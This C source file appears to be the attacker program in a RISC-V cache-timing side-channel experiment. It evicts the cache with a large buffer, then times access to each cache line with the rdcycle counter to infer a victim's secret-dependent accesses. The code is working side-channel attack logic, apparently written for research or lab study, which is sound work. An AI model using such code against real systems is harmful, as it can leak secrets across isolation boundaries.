#include "lib.h"
#include "io.h"
#include "str.h"

#define CACHELINE 64
#define PAGE 4096

char *secret = (char*)0x3fff0000UL;

#define GARBAGE (512 * 1024)
_Alignas(4096) char garbagebuf[GARBAGE];

uint64_t __attribute__((optimize("O0"))) measure_access_time(int index) {
	uint64_t start, end;

	// Inline assembly to read the RISC-V cycle counter
	asm volatile("rdcycle %0" : "=r"(start));
	char data = garbagebuf[index * CACHELINE];
	asm volatile("rdcycle %0" : "=r"(end));

	return end - start;
}

int main() {
	busy_loop(25000);
	// usleep(2000000);
	printf("[2] attacker: done spinning\n");

	printf("garbagebuf address %p\n", garbagebuf);

	// evict all cache
	memset(garbagebuf, 0xcc, GARBAGE);
	printf("[3] attacker: done filling\n");

	busy_loop(1000000);
	printf("[7] attacker: done spinning second time\n");

	printf("[8] Measuring access time for accessing secret data...\n");

	// for (int i = 2; i < 4; ++i) {
	// 	uint64_t access_time = measure_access_time(PAGE / CACHELINE + i);

	// 	printf("[9] Access time for index %d: %lu cycles\n", i, access_time);
	// }
	// for (int i = 2; i < 4; ++i) {
	// 	uint64_t access_time = measure_access_time(i);

	// 	printf("[9] Access time for index %d: %lu cycles\n", i, access_time);
	// }
	for (int i = 0; i < PAGE / CACHELINE; ++i) {
		uint64_t access_time = measure_access_time(i);

		printf("[9] Access time for index %d: %lu cycles\n", i, access_time);
	}
}
